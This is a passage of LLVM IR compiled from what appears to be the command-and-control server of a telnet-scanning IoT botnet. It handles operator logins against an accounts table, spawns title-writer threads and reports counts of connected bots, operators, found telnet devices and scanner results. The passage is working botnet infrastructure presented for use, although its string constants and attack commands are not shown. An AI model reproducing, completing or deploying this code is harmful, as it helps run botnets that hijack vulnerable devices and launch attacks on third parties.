  %179 = icmp slt i32 %178, 1
  br i1 %179, label %180, label %181

180:                                              ; preds = %175
  br label %1075

181:                                              ; preds = %175
  %182 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* %182)
  %183 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %184 = load i32, i32* %5, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %185
  %187 = getelementptr inbounds %struct.login_info, %struct.login_info* %186, i32 0, i32 1
  %188 = getelementptr inbounds [100 x i8], [100 x i8]* %187, i64 0, i64 0
  %189 = call i32 @strcmp(i8* %183, i8* %188) #8
  %190 = icmp ne i32 %189, 0
  br i1 %190, label %191, label %192

191:                                              ; preds = %181
  br label %318

192:                                              ; preds = %181
  %193 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %193, i8 0, i64 2048, i1 false)
  %194 = getelementptr inbounds [1000 x i8], [1000 x i8]* %21, i64 0, i64 0
  %195 = load i32, i32* %5, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %196
  %198 = getelementptr inbounds %struct.login_info, %struct.login_info* %197, i32 0, i32 0
  %199 = getelementptr inbounds [100 x i8], [100 x i8]* %198, i64 0, i64 0
  %200 = call i32 (i8*, i8*, ...) @sprintf(i8* %194, i8* getelementptr inbounds ([93 x i8], [93 x i8]* @.str.22, i64 0, i64 0), i8* %199) #9
  %201 = getelementptr inbounds [1000 x i8], [1000 x i8]* %22, i64 0, i64 0
  %202 = load i32, i32* %5, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %203
  %205 = getelementptr inbounds %struct.login_info, %struct.login_info* %204, i32 0, i32 0
  %206 = getelementptr inbounds [100 x i8], [100 x i8]* %205, i64 0, i64 0
  %207 = call i32 (i8*, i8*, ...) @sprintf(i8* %201, i8* getelementptr inbounds ([93 x i8], [93 x i8]* @.str.23, i64 0, i64 0), i8* %206) #9
  %208 = getelementptr inbounds [1000 x i8], [1000 x i8]* %23, i64 0, i64 0
  %209 = load i32, i32* %5, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %210
  %212 = getelementptr inbounds %struct.login_info, %struct.login_info* %211, i32 0, i32 0
  %213 = getelementptr inbounds [100 x i8], [100 x i8]* %212, i64 0, i64 0
  %214 = call i32 (i8*, i8*, ...) @sprintf(i8* %208, i8* getelementptr inbounds ([93 x i8], [93 x i8]* @.str.24, i64 0, i64 0), i8* %213) #9
  %215 = getelementptr inbounds [1000 x i8], [1000 x i8]* %24, i64 0, i64 0
  %216 = load i32, i32* %5, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %217
  %219 = getelementptr inbounds %struct.login_info, %struct.login_info* %218, i32 0, i32 0
  %220 = getelementptr inbounds [100 x i8], [100 x i8]* %219, i64 0, i64 0
  %221 = call i32 (i8*, i8*, ...) @sprintf(i8* %215, i8* getelementptr inbounds ([93 x i8], [93 x i8]* @.str.23, i64 0, i64 0), i8* %220) #9
  %222 = getelementptr inbounds [1000 x i8], [1000 x i8]* %25, i64 0, i64 0
  %223 = call i32 (i8*, i8*, ...) @sprintf(i8* %222, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.25, i64 0, i64 0)) #9
  %224 = load i32, i32* %4, align 4
  %225 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %226 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %227 = call i64 @strlen(i8* %226) #8
  %228 = call i64 @send(i32 %224, i8* %225, i64 %227, i32 16384)
  %229 = icmp eq i64 %228, -1
  br i1 %229, label %230, label %231

230:                                              ; preds = %192
  br label %1075

231:                                              ; preds = %192
  %232 = load i32, i32* %4, align 4
  %233 = getelementptr inbounds [1000 x i8], [1000 x i8]* %21, i64 0, i64 0
  %234 = getelementptr inbounds [1000 x i8], [1000 x i8]* %21, i64 0, i64 0
  %235 = call i64 @strlen(i8* %234) #8
  %236 = call i64 @send(i32 %232, i8* %233, i64 %235, i32 16384)
  %237 = icmp eq i64 %236, -1
  br i1 %237, label %238, label %239

238:                                              ; preds = %231
  br label %1075

239:                                              ; preds = %231
  %240 = call i32 @sleep(i32 1)
  %241 = load i32, i32* %4, align 4
  %242 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %243 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %244 = call i64 @strlen(i8* %243) #8
  %245 = call i64 @send(i32 %241, i8* %242, i64 %244, i32 16384)
  %246 = icmp eq i64 %245, -1
  br i1 %246, label %247, label %248

247:                                              ; preds = %239
  br label %1075

248:                                              ; preds = %239
  %249 = load i32, i32* %4, align 4
  %250 = getelementptr inbounds [1000 x i8], [1000 x i8]* %22, i64 0, i64 0
  %251 = getelementptr inbounds [1000 x i8], [1000 x i8]* %22, i64 0, i64 0
  %252 = call i64 @strlen(i8* %251) #8
  %253 = call i64 @send(i32 %249, i8* %250, i64 %252, i32 16384)
  %254 = icmp eq i64 %253, -1
  br i1 %254, label %255, label %256

255:                                              ; preds = %248
  br label %1075

256:                                              ; preds = %248
  %257 = call i32 @sleep(i32 1)
  %258 = load i32, i32* %4, align 4
  %259 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %260 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %261 = call i64 @strlen(i8* %260) #8
  %262 = call i64 @send(i32 %258, i8* %259, i64 %261, i32 16384)
  %263 = icmp eq i64 %262, -1
  br i1 %263, label %264, label %265

264:                                              ; preds = %256
  br label %1075

265:                                              ; preds = %256
  %266 = load i32, i32* %4, align 4
  %267 = getelementptr inbounds [1000 x i8], [1000 x i8]* %23, i64 0, i64 0
  %268 = getelementptr inbounds [1000 x i8], [1000 x i8]* %23, i64 0, i64 0
  %269 = call i64 @strlen(i8* %268) #8
  %270 = call i64 @send(i32 %266, i8* %267, i64 %269, i32 16384)
  %271 = icmp eq i64 %270, -1
  br i1 %271, label %272, label %273

272:                                              ; preds = %265
  br label %1075

273:                                              ; preds = %265
  %274 = call i32 @sleep(i32 1)
  %275 = load i32, i32* %4, align 4
  %276 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %277 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %278 = call i64 @strlen(i8* %277) #8
  %279 = call i64 @send(i32 %275, i8* %276, i64 %278, i32 16384)
  %280 = icmp eq i64 %279, -1
  br i1 %280, label %281, label %282

281:                                              ; preds = %273
  br label %1075

282:                                              ; preds = %273
  %283 = load i32, i32* %4, align 4
  %284 = getelementptr inbounds [1000 x i8], [1000 x i8]* %24, i64 0, i64 0
  %285 = getelementptr inbounds [1000 x i8], [1000 x i8]* %24, i64 0, i64 0
  %286 = call i64 @strlen(i8* %285) #8
  %287 = call i64 @send(i32 %283, i8* %284, i64 %286, i32 16384)
  %288 = icmp eq i64 %287, -1
  br i1 %288, label %289, label %290

289:                                              ; preds = %282
  br label %1075

290:                                              ; preds = %282
  %291 = call i32 @sleep(i32 1)
  %292 = load i32, i32* %4, align 4
  %293 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %294 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %295 = call i64 @strlen(i8* %294) #8
  %296 = call i64 @send(i32 %292, i8* %293, i64 %295, i32 16384)
  %297 = icmp eq i64 %296, -1
  br i1 %297, label %298, label %299

298:                                              ; preds = %290
  br label %1075

299:                                              ; preds = %290
  %300 = load i32, i32* %4, align 4
  %301 = getelementptr inbounds [1000 x i8], [1000 x i8]* %25, i64 0, i64 0
  %302 = getelementptr inbounds [1000 x i8], [1000 x i8]* %25, i64 0, i64 0
  %303 = call i64 @strlen(i8* %302) #8
  %304 = call i64 @send(i32 %300, i8* %301, i64 %303, i32 16384)
  %305 = icmp eq i64 %304, -1
  br i1 %305, label %306, label %307

306:                                              ; preds = %299
  br label %1075

307:                                              ; preds = %299
  %308 = call i32 @sleep(i32 1)
  %309 = load i32, i32* %4, align 4
  %310 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %311 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %312 = call i64 @strlen(i8* %311) #8
  %313 = call i64 @send(i32 %309, i8* %310, i64 %312, i32 16384)
  %314 = icmp eq i64 %313, -1
  br i1 %314, label %315, label %316

315:                                              ; preds = %307
  br label %1075

316:                                              ; preds = %307
  br label %324

317:                                              ; preds = %132
  br label %318

318:                                              ; preds = %317, %191
  %319 = load i32, i32* %4, align 4
  %320 = call i64 @send(i32 %319, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.18, i64 0, i64 0), i64 5, i32 16384)
  %321 = icmp eq i64 %320, -1
  br i1 %321, label %322, label %323

322:                                              ; preds = %318
  br label %1075

323:                                              ; preds = %318
  br label %1075

324:                                              ; preds = %316
  %325 = load i8*, i8** %3, align 8
  %326 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %325) #9
  %327 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %328 = call i32 (i8*, i8*, ...) @sprintf(i8* %327, i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.26, i64 0, i64 0)) #9
  %329 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %330 = call i32 (i8*, i8*, ...) @sprintf(i8* %329, i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.27, i64 0, i64 0)) #9
  %331 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %332 = call i32 (i8*, i8*, ...) @sprintf(i8* %331, i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.28, i64 0, i64 0)) #9
  %333 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %334 = call i32 (i8*, i8*, ...) @sprintf(i8* %333, i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.29, i64 0, i64 0)) #9
  %335 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %336 = call i32 (i8*, i8*, ...) @sprintf(i8* %335, i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.30, i64 0, i64 0)) #9
  %337 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i64 0, i64 0
  %338 = call i32 (i8*, i8*, ...) @sprintf(i8* %337, i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.31, i64 0, i64 0)) #9
  %339 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i64 0, i64 0
  %340 = call i32 (i8*, i8*, ...) @sprintf(i8* %339, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.32, i64 0, i64 0)) #9
  %341 = load i32, i32* %4, align 4
  %342 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %343 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %344 = call i64 @strlen(i8* %343) #8
  %345 = call i64 @send(i32 %341, i8* %342, i64 %344, i32 16384)
  %346 = icmp eq i64 %345, -1
  br i1 %346, label %347, label %348

347:                                              ; preds = %324
  br label %1075

348:                                              ; preds = %324
  %349 = load i32, i32* %4, align 4
  %350 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %351 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %352 = call i64 @strlen(i8* %351) #8
  %353 = call i64 @send(i32 %349, i8* %350, i64 %352, i32 16384)
  %354 = icmp eq i64 %353, -1
  br i1 %354, label %355, label %356

355:                                              ; preds = %348
  br label %1075

356:                                              ; preds = %348
  %357 = load i32, i32* %4, align 4
  %358 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %359 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %360 = call i64 @strlen(i8* %359) #8
  %361 = call i64 @send(i32 %357, i8* %358, i64 %360, i32 16384)
  %362 = icmp eq i64 %361, -1
  br i1 %362, label %363, label %364

363:                                              ; preds = %356
  br label %1075

364:                                              ; preds = %356
  %365 = load i32, i32* %4, align 4
  %366 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %367 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %368 = call i64 @strlen(i8* %367) #8
  %369 = call i64 @send(i32 %365, i8* %366, i64 %368, i32 16384)
  %370 = icmp eq i64 %369, -1
  br i1 %370, label %371, label %372

371:                                              ; preds = %364
  br label %1075

372:                                              ; preds = %364
  %373 = load i32, i32* %4, align 4
  %374 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %375 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %376 = call i64 @strlen(i8* %375) #8
  %377 = call i64 @send(i32 %373, i8* %374, i64 %376, i32 16384)
  %378 = icmp eq i64 %377, -1
  br i1 %378, label %379, label %380

379:                                              ; preds = %372
  br label %1075

380:                                              ; preds = %372
  %381 = load i32, i32* %4, align 4
  %382 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %383 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %384 = call i64 @strlen(i8* %383) #8
  %385 = call i64 @send(i32 %381, i8* %382, i64 %384, i32 16384)
  %386 = icmp eq i64 %385, -1
  br i1 %386, label %387, label %388

387:                                              ; preds = %380
  br label %1075

388:                                              ; preds = %380
  %389 = load i32, i32* %4, align 4
  %390 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i64 0, i64 0
  %391 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i64 0, i64 0
  %392 = call i64 @strlen(i8* %391) #8
  %393 = call i64 @send(i32 %389, i8* %390, i64 %392, i32 16384)
  %394 = icmp eq i64 %393, -1
  br i1 %394, label %395, label %396

395:                                              ; preds = %388
  br label %1075

396:                                              ; preds = %388
  %397 = load i32, i32* %4, align 4
  %398 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i64 0, i64 0
  %399 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i64 0, i64 0
  %400 = call i64 @strlen(i8* %399) #8
  %401 = call i64 @send(i32 %397, i8* %398, i64 %400, i32 16384)
  %402 = icmp eq i64 %401, -1
  br i1 %402, label %403, label %404

403:                                              ; preds = %396
  br label %1075

404:                                              ; preds = %396
  br label %405

405:                                              ; preds = %404
  %406 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i64 0, i64 0
  %407 = load i32, i32* %5, align 4
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %408
  %410 = getelementptr inbounds %struct.login_info, %struct.login_info* %409, i32 0, i32 0
  %411 = getelementptr inbounds [100 x i8], [100 x i8]* %410, i64 0, i64 0
  %412 = call i32 (i8*, i8*, ...) @sprintf(i8* %406, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.33, i64 0, i64 0), i8* %411) #9
  %413 = load i32, i32* %4, align 4
  %414 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i64 0, i64 0
  %415 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i64 0, i64 0
  %416 = call i64 @strlen(i8* %415) #8
  %417 = call i64 @send(i32 %413, i8* %414, i64 %416, i32 16384)
  %418 = icmp eq i64 %417, -1
  br i1 %418, label %419, label %420

419:                                              ; preds = %405
  br label %1075

420:                                              ; preds = %405
  br label %421

421:                                              ; preds = %420
  %422 = load i8*, i8** %3, align 8
  %423 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %422) #9
  %424 = load i32, i32* %4, align 4
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %425
  %427 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %426, i32 0, i32 0
  store i32 1, i32* %427, align 4
  br label %428

428:                                              ; preds = %1041, %1040, %951, %854, %757, %660, %619, %614, %490, %421
  %429 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %430 = load i32, i32* %4, align 4
  %431 = call i32 @fdgets(i8* %429, i32 2048, i32 %430)
  %432 = icmp sgt i32 %431, 0
  br i1 %432, label %433, label %1074

433:                                              ; preds = %428
  %434 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %435 = call i8* @strstr(i8* %434, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i64 0, i64 0)) #8
  %436 = icmp ne i8* %435, null
  br i1 %436, label %437, label %491

437:                                              ; preds = %433
  %438 = getelementptr inbounds [2048 x i8], [2048 x i8]* %35, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %438, i8 0, i64 2048, i1 false)
  %439 = getelementptr inbounds [2048 x i8], [2048 x i8]* %36, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %439, i8 0, i64 2048, i1 false)
  %440 = getelementptr inbounds [2048 x i8], [2048 x i8]* %35, i64 0, i64 0
  %441 = call i32 @BotsConnected()
  %442 = load volatile i32, i32* @OperatorsConnected, align 4
  %443 = call i32 (i8*, i8*, ...) @sprintf(i8* %440, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.35, i64 0, i64 0), i32 %441, i32 %442) #9
  %444 = getelementptr inbounds [2048 x i8], [2048 x i8]* %36, i64 0, i64 0
  %445 = load volatile i32, i32* @TELFound, align 4
  %446 = load volatile i32, i32* @scannerreport, align 4
  %447 = call i32 (i8*, i8*, ...) @sprintf(i8* %444, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.36, i64 0, i64 0), i32 %445, i32 %446) #9
  %448 = getelementptr inbounds [2048 x i8], [2048 x i8]* %37, i64 0, i64 0
  %449 = load volatile i32, i32* @OperatorsConnected, align 4
  %450 = load volatile i32, i32* @scannerreport, align 4
  %451 = call i32 (i8*, i8*, ...) @sprintf(i8* %448, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.37, i64 0, i64 0), i32 %449, i32 %450) #9
  %452 = load i32, i32* %4, align 4
  %453 = getelementptr inbounds [2048 x i8], [2048 x i8]* %35, i64 0, i64 0
  %454 = getelementptr inbounds [2048 x i8], [2048 x i8]* %35, i64 0, i64 0
  %455 = call i64 @strlen(i8* %454) #8
  %456 = call i64 @send(i32 %452, i8* %453, i64 %455, i32 16384)
  %457 = icmp eq i64 %456, -1
  br i1 %457, label %458, label %459

458:                                              ; preds = %437
  store i8* null, i8** %2, align 8
  br label %1084

459:                                              ; preds = %437
  %460 = load i32, i32* %4, align 4
  %461 = getelementptr inbounds [2048 x i8], [2048 x i8]* %36, i64 0, i64 0
  %462 = getelementptr inbounds [2048 x i8], [2048 x i8]* %36, i64 0, i64 0
  %463 = call i64 @strlen(i8* %462) #8
  %464 = call i64 @send(i32 %460, i8* %461, i64 %463, i32 16384)
  %465 = icmp eq i64 %464, -1
  br i1 %465, label %466, label %467

466:                                              ; preds = %459
  store i8* null, i8** %2, align 8
  br label %1084

467:                                              ; preds = %459
  %468 = load i32, i32* %4, align 4
  %469 = getelementptr inbounds [2048 x i8], [2048 x i8]* %37, i64 0, i64 0
  %470 = getelementptr inbounds [2048 x i8], [2048 x i8]* %37, i64 0, i64 0
  %471 = call i64 @strlen(i8* %470) #8
  %472 = call i64 @send(i32 %468, i8* %469, i64 %471, i32 16384)
  %473 = icmp eq i64 %472, -1
  br i1 %473, label %474, label %475

474:                                              ; preds = %467
  store i8* null, i8** %2, align 8
  br label %1084

475:                                              ; preds = %467
  %476 = getelementptr inbounds [5000 x i8], [5000 x i8]* %38, i64 0, i64 0
  %477 = load i32, i32* %5, align 4
  %478 = sext i32 %477 to i64
  %479 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %478
  %480 = getelementptr inbounds %struct.login_info, %struct.login_info* %479, i32 0, i32 0
  %481 = getelementptr inbounds [100 x i8], [100 x i8]* %480, i64 0, i64 0
  %482 = call i32 (i8*, i8*, ...) @sprintf(i8* %476, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.33, i64 0, i64 0), i8* %481) #9
  %483 = load i32, i32* %4, align 4
  %484 = getelementptr inbounds [5000 x i8], [5000 x i8]* %38, i64 0, i64 0
  %485 = getelementptr inbounds [5000 x i8], [5000 x i8]* %38, i64 0, i64 0
  %486 = call i64 @strlen(i8* %485) #8
  %487 = call i64 @send(i32 %483, i8* %484, i64 %486, i32 16384)
  %488 = icmp eq i64 %487, -1
  br i1 %488, label %489, label %490

489:                                              ; preds = %475
  br label %1075

490:                                              ; preds = %475
  br label %428, !llvm.loop !19

491:                                              ; preds = %433
  %492 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %493 = call i8* @strstr(i8* %492, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.38, i64 0, i64 0)) #8
  %494 = icmp ne i8* %493, null
  br i1 %494, label %495, label %615

495:                                              ; preds = %491
  %496 = load i8*, i8** %3, align 8
  %497 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %496) #9
  %498 = getelementptr inbounds [800 x i8], [800 x i8]* %39, i64 0, i64 0
  %499 = call i32 (i8*, i8*, ...) @sprintf(i8* %498, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.39, i64 0, i64 0)) #9
  %500 = getelementptr inbounds [800 x i8], [800 x i8]* %40, i64 0, i64 0
  %501 = call i32 (i8*, i8*, ...) @sprintf(i8* %500, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.40, i64 0, i64 0)) #9
  %502 = getelementptr inbounds [800 x i8], [800 x i8]* %41, i64 0, i64 0
  %503 = call i32 (i8*, i8*, ...) @sprintf(i8* %502, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.41, i64 0, i64 0)) #9
  %504 = getelementptr inbounds [800 x i8], [800 x i8]* %42, i64 0, i64 0
  %505 = call i32 (i8*, i8*, ...) @sprintf(i8* %504, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.42, i64 0, i64 0)) #9
  %506 = getelementptr inbounds [800 x i8], [800 x i8]* %43, i64 0, i64 0
  %507 = call i32 (i8*, i8*, ...) @sprintf(i8* %506, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.43, i64 0, i64 0)) #9
  %508 = getelementptr inbounds [800 x i8], [800 x i8]* %44, i64 0, i64 0
  %509 = call i32 (i8*, i8*, ...) @sprintf(i8* %508, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.44, i64 0, i64 0)) #9
  %510 = getelementptr inbounds [800 x i8], [800 x i8]* %45, i64 0, i64 0
  %511 = call i32 (i8*, i8*, ...) @sprintf(i8* %510, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.45, i64 0, i64 0)) #9
  %512 = getelementptr inbounds [800 x i8], [800 x i8]* %46, i64 0, i64 0
  %513 = call i32 (i8*, i8*, ...) @sprintf(i8* %512, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.46, i64 0, i64 0)) #9
  %514 = getelementptr inbounds [800 x i8], [800 x i8]* %47, i64 0, i64 0
  %515 = call i32 (i8*, i8*, ...) @sprintf(i8* %514, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.47, i64 0, i64 0)) #9
  %516 = getelementptr inbounds [800 x i8], [800 x i8]* %48, i64 0, i64 0
  %517 = call i32 (i8*, i8*, ...) @sprintf(i8* %516, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.48, i64 0, i64 0)) #9
  %518 = load i32, i32* %4, align 4
  %519 = getelementptr inbounds [800 x i8], [800 x i8]* %39, i64 0, i64 0
  %520 = getelementptr inbounds [800 x i8], [800 x i8]* %39, i64 0, i64 0
  %521 = call i64 @strlen(i8* %520) #8
  %522 = call i64 @send(i32 %518, i8* %519, i64 %521, i32 16384)
  %523 = icmp eq i64 %522, -1
  br i1 %523, label %524, label %525

524:                                              ; preds = %495
  br label %1075

525:                                              ; preds = %495
  %526 = load i32, i32* %4, align 4
  %527 = getelementptr inbounds [800 x i8], [800 x i8]* %40, i64 0, i64 0
  %528 = getelementptr inbounds [800 x i8], [800 x i8]* %40, i64 0, i64 0
  %529 = call i64 @strlen(i8* %528) #8
  %530 = call i64 @send(i32 %526, i8* %527, i64 %529, i32 16384)
  %531 = icmp eq i64 %530, -1
  br i1 %531, label %532, label %533

532:                                              ; preds = %525
  br label %1075

533:                                              ; preds = %525
  %534 = load i32, i32* %4, align 4
  %535 = getelementptr inbounds [800 x i8], [800 x i8]* %41, i64 0, i64 0
  %536 = getelementptr inbounds [800 x i8], [800 x i8]* %41, i64 0, i64 0
  %537 = call i64 @strlen(i8* %536) #8
  %538 = call i64 @send(i32 %534, i8* %535, i64 %537, i32 16384)
  %539 = icmp eq i64 %538, -1
  br i1 %539, label %540, label %541

540:                                              ; preds = %533
  br label %1075

541:                                              ; preds = %533
  %542 = load i32, i32* %4, align 4
  %543 = getelementptr inbounds [800 x i8], [800 x i8]* %42, i64 0, i64 0
  %544 = getelementptr inbounds [800 x i8], [800 x i8]* %42, i64 0, i64 0
  %545 = call i64 @strlen(i8* %544) #8
  %546 = call i64 @send(i32 %542, i8* %543, i64 %545, i32 16384)
  %547 = icmp eq i64 %546, -1
  br i1 %547, label %548, label %549

548:                                              ; preds = %541
  br label %1075

549:                                              ; preds = %541
  %550 = load i32, i32* %4, align 4
  %551 = getelementptr inbounds [800 x i8], [800 x i8]* %43, i64 0, i64 0
  %552 = getelementptr inbounds [800 x i8], [800 x i8]* %43, i64 0, i64 0
  %553 = call i64 @strlen(i8* %552) #8
  %554 = call i64 @send(i32 %550, i8* %551, i64 %553, i32 16384)
  %555 = icmp eq i64 %554, -1
  br i1 %555, label %556, label %557

556:                                              ; preds = %549
  br label %1075

557:                                              ; preds = %549
  %558 = load i32, i32* %4, align 4
  %559 = getelementptr inbounds [800 x i8], [800 x i8]* %44, i64 0, i64 0
  %560 = getelementptr inbounds [800 x i8], [800 x i8]* %44, i64 0, i64 0
  %561 = call i64 @strlen(i8* %560) #8
  %562 = call i64 @send(i32 %558, i8* %559, i64 %561, i32 16384)
  %563 = icmp eq i64 %562, -1
  br i1 %563, label %564, label %565

564:                                              ; preds = %557
  br label %1075

565:                                              ; preds = %557
  %566 = load i32, i32* %4, align 4
  %567 = getelementptr inbounds [800 x i8], [800 x i8]* %45, i64 0, i64 0
  %568 = getelementptr inbounds [800 x i8], [800 x i8]* %45, i64 0, i64 0
  %569 = call i64 @strlen(i8* %568) #8
  %570 = call i64 @send(i32 %566, i8* %567, i64 %569, i32 16384)
  %571 = icmp eq i64 %570, -1
  br i1 %571, label %572, label %573

572:                                              ; preds = %565
  br label %1075

573:                                              ; preds = %565
  %574 = load i32, i32* %4, align 4
  %575 = getelementptr inbounds [800 x i8], [800 x i8]* %46, i64 0, i64 0
  %576 = getelementptr inbounds [800 x i8], [800 x i8]* %46, i64 0, i64 0
  %577 = call i64 @strlen(i8* %576) #8
  %578 = call i64 @send(i32 %574, i8* %575, i64 %577, i32 16384)
  %579 = icmp eq i64 %578, -1
  br i1 %579, label %580, label %581

580:                                              ; preds = %573
  br label %1075

581:                                              ; preds = %573
  %582 = load i32, i32* %4, align 4
  %583 = getelementptr inbounds [800 x i8], [800 x i8]* %47, i64 0, i64 0
  %584 = getelementptr inbounds [800 x i8], [800 x i8]* %47, i64 0, i64 0
  %585 = call i64 @strlen(i8* %584) #8
  %586 = call i64 @send(i32 %582, i8* %583, i64 %585, i32 16384)
  %587 = icmp eq i64 %586, -1
  br i1 %587, label %588, label %589

588:                                              ; preds = %581
  br label %1075

589:                                              ; preds = %581
  %590 = load i32, i32* %4, align 4
  %591 = getelementptr inbounds [800 x i8], [800 x i8]* %48, i64 0, i64 0
  %592 = getelementptr inbounds [800 x i8], [800 x i8]* %48, i64 0, i64 0
  %593 = call i64 @strlen(i8* %592) #8
  %594 = call i64 @send(i32 %590, i8* %591, i64 %593, i32 16384)
  %595 = icmp eq i64 %594, -1
  br i1 %595, label %596, label %597

596:                                              ; preds = %589
  br label %1075

597:                                              ; preds = %589
  %598 = load i8*, i8** %3, align 8
  %599 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %598) #9
  %600 = getelementptr inbounds [5000 x i8], [5000 x i8]* %49, i64 0, i64 0
  %601 = load i32, i32* %5, align 4
  %602 = sext i32 %601 to i64
  %603 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %602
  %604 = getelementptr inbounds %struct.login_info, %struct.login_info* %603, i32 0, i32 0
  %605 = getelementptr inbounds [100 x i8], [100 x i8]* %604, i64 0, i64 0
